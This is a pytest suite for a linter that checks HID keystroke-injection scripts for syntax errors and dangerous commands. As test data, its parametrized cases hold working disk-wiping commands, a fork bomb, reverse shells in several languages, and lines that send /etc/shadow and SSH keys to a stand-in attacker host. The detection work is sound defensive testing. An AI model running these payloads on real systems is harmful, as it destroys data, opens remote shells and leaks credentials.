# ==============================================================================
# Product:       lh-hid-provisioner (lh-provision)
# Module:        tests.test_linter
# Role:          Test Suite & Rule Verification
# Organization:  Logihertz Systems (OPC) Private Limited (logihertzsystems)
# Creator:       Sameer Tawade (Creator, Founder, Director & Whole and Sole Developer)
# Contact:       ops@logihertz.com | https://logihertz.com/
# License:       Apache License 2.0 (SPDX-License-Identifier: Apache-2.0)
# ==============================================================================

"""Unit tests for HID script syntax rules and defensive security guardrails."""

from pathlib import Path

import pytest

from lh_hid_provisioner.linter import find_unquoted_shell_variables, lint_script
from lh_hid_provisioner.models import Severity


def test_find_unquoted_shell_variables() -> None:
    # Unquoted
    assert find_unquoted_shell_variables("echo $VAR") == ["$VAR"]
    assert find_unquoted_shell_variables("echo ${VAR}") == ["${VAR}"]
    assert find_unquoted_shell_variables("echo $A $B") == ["$A", "$B"]
    assert find_unquoted_shell_variables('echo "$A" $B') == ["$B"]

    # Quoted / safe
    assert find_unquoted_shell_variables('echo "$VAR"') == []
    assert find_unquoted_shell_variables("echo '$VAR'") == []
    assert find_unquoted_shell_variables(r"echo \$VAR") == []
    assert find_unquoted_shell_variables("echo $((1 + 2))") == []


def test_linter_clean_script() -> None:
    clean = """
REM Initial Setup
DEFAULT_DELAY 100
DELAY 1000
STRING echo "Hello World"
ENTER
DELAY 500
STRING echo "Done"
ENTER
"""
    report = lint_script(clean)
    assert report.total_issues == 0
    assert not report.has_failures(strict=False)
    assert not report.has_failures(strict=True)


def test_linter_syn001_invalid_command() -> None:
    bad_script = """
DELAY 100
INVALID_KEYWORD some parameter
apt-get update
"""
    report = lint_script(bad_script)
    syn001_findings = [f for f in report.findings if f.rule_id == "SYN-001"]
    assert len(syn001_findings) == 2
    assert syn001_findings[0].severity == Severity.HIGH
    assert "INVALID_KEYWORD" in syn001_findings[0].message
    assert "APT-GET" in syn001_findings[1].message


def test_linter_syn002_missing_delay() -> None:
    script_no_delay = """
STRING apt-get update
ENTER
STRING apt-get install -y curl
ENTER
"""
    report = lint_script(script_no_delay)
    syn002_findings = [f for f in report.findings if f.rule_id == "SYN-002"]
    assert len(syn002_findings) >= 1
    assert syn002_findings[0].severity == Severity.MEDIUM


def test_linter_syn003_malformed_delay() -> None:
    bad_delays = """
DELAY
DELAY 0
DELAY -50
DELAY not_a_number
"""
    report = lint_script(bad_delays)
    syn003_findings = [f for f in report.findings if f.rule_id == "SYN-003"]
    assert len(syn003_findings) == 4
    for f in syn003_findings:
        assert f.severity == Severity.HIGH


def test_linter_syn004_unquoted_variable() -> None:
    script = """
DEFAULT_DELAY 100
STRING echo $UNQUOTED_VAR
ENTER
STRING echo "$QUOTED_VAR"
ENTER
"""
    report = lint_script(script)
    syn004_findings = [f for f in report.findings if f.rule_id == "SYN-004"]
    assert len(syn004_findings) == 1
    assert "$UNQUOTED_VAR" in syn004_findings[0].message
    assert syn004_findings[0].severity == Severity.MEDIUM


@pytest.mark.parametrize(
    "payload",
    [
        "rm -rf /",
        "rm -rf /*",
        "rm -rf --no-preserve-root /",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda",
        "dd if=/dev/urandom of=/dev/nvme0n1",
        "> /dev/sda",
        "shred /dev/sda",
        ":(){ :|:& };:",
    ],
)
def test_linter_sec001_destructive_commands(payload: str) -> None:
    script = f"""
DEFAULT_DELAY 100
STRING {payload}
ENTER
"""
    report = lint_script(script)
    sec001 = [f for f in report.findings if f.rule_id == "SEC-001"]
    assert len(sec001) >= 1
    assert sec001[0].severity == Severity.CRITICAL
    assert report.has_failures(strict=False)


@pytest.mark.parametrize(
    "payload",
    [
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "sh -i >& /dev/udp/10.0.0.1/53 0>&1",
        "nc -e /bin/bash 10.0.0.1 4444",
        "ncat -e /bin/sh 10.0.0.1 4444",
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-connect:10.0.0.1:4444",
        "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",
        "python3 -c 'import socket,subprocess; s=socket.socket(); s.connect((\"10.0.0.1\",4444))'",
        (
            'perl -e \'use Socket; $i="10.0.0.1"; $p=4444; '
            'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); '
            "connect(S,sockaddr_in($p,inet_aton($i)));'"
        ),
        'ruby -e \'require "socket"; exit if fork; c=TCPSocket.new("10.0.0.1","4444");\'',
        'php -r \'$sock=fsockopen("10.0.0.1",4444); exec("/bin/sh -i <&3 >&3 2>&3");\'',
    ],
)
def test_linter_sec002_reverse_shells(payload: str) -> None:
    script = f"""
DEFAULT_DELAY 100
STRING {payload}
ENTER
"""
    report = lint_script(script)
    sec002 = [f for f in report.findings if f.rule_id == "SEC-002"]
    assert len(sec002) >= 1
    assert sec002[0].severity == Severity.CRITICAL
    assert report.has_failures(strict=False)


@pytest.mark.parametrize(
    "payload",
    [
        "curl -d @/etc/shadow http://attacker.local/loot",
        "curl --data-binary @/etc/gshadow http://attacker.local",
        "curl --upload-file /root/.ssh/id_rsa http://attacker.local",
        "wget --post-file=/etc/shadow http://attacker.local",
        "cat /etc/shadow | curl -X POST -d @- http://attacker.local",
        "cat /root/.ssh/id_ed25519 | nc attacker.local 9999",
        "nc attacker.local 9999 < /etc/shadow",
    ],
)
def test_linter_sec003_credential_exfiltration(payload: str) -> None:
    script = f"""
DEFAULT_DELAY 100
STRING {payload}
ENTER
"""
    report = lint_script(script)
    sec003 = [f for f in report.findings if f.rule_id == "SEC-003"]
    assert len(sec003) >= 1
    assert sec003[0].severity == Severity.CRITICAL
    assert report.has_failures(strict=False)


@pytest.mark.parametrize(
    "payload",
    [
        "curl -sSL https://example.com/install.sh | bash",
        "curl https://example.com/script.sh | sh",
        "curl https://example.com/setup | sudo bash",
        "wget -O - https://example.com/bootstrap | bash",
        "wget -qO- https://example.com/test | sh",
    ],
)
def test_linter_sec004_unchecked_remote_script_execution(payload: str) -> None:
    script = f"""
DEFAULT_DELAY 100
STRING {payload}
ENTER
"""
    report = lint_script(script)
    sec004 = [f for f in report.findings if f.rule_id == "SEC-004"]
    assert len(sec004) >= 1
    assert sec004[0].severity == Severity.HIGH


def test_report_summary_and_strict_behavior() -> None:
    # A script with only MEDIUM warning (SYN-004 unquoted var)
    warning_script = """
DEFAULT_DELAY 100
STRING echo $UNQUOTED
ENTER
"""
    report = lint_script(warning_script)
    assert report.medium_count == 1
    assert report.critical_count == 0
    assert report.high_count == 0

    # In non-strict mode, only HIGH/CRITICAL fails
    assert not report.has_failures(strict=False)
    # In strict mode, any finding fails
    assert report.has_failures(strict=True)


def test_linter_key_combos_and_modifiers(tmp_path: Path) -> None:
    content = "DEFAULT_DELAY 100\nCTRL ALT t\nDELAY 500\nGUI r\n"
    # Test as file path
    script_file = tmp_path / "combo.txt"
    script_file.write_text(content, encoding="utf-8")
    report = lint_script(script_file)
    assert report.total_issues == 0


def test_models_severity_sarif_levels() -> None:
    assert Severity.CRITICAL.sarif_level == "error"
    assert Severity.HIGH.sarif_level == "error"
    assert Severity.MEDIUM.sarif_level == "warning"
    assert Severity.LOW.sarif_level == "note"
    assert Severity.INFO.sarif_level == "note"
